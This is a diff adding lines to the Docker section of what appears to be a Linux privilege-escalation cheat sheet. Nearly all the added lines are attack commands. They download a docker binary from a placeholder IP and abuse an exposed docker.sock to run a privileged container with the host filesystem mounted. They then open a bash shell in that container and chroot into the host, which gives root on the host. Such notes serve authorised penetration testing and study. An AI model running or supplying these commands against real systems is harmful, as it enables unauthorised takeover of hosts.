@@ -2006,7 +2006,16 @@ $ lxc exec r00t /bin/sh
 - Docker
 
 ```
+$ docker image ls
 $ docker run -v /root:/mnt -it ubuntu
+https://master.dockerproject.com/linux/x86_64/docker
+$ wget https://<IP address>:443/docker -O docker
+$ chmod +x docker
+$ /tmp/docker -H unix:///app/docker.sock ps
+$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+$ /tmp/docker -H unix:///app/docker.sock ps
+$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
+$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
 ```
 
 - Disk Group
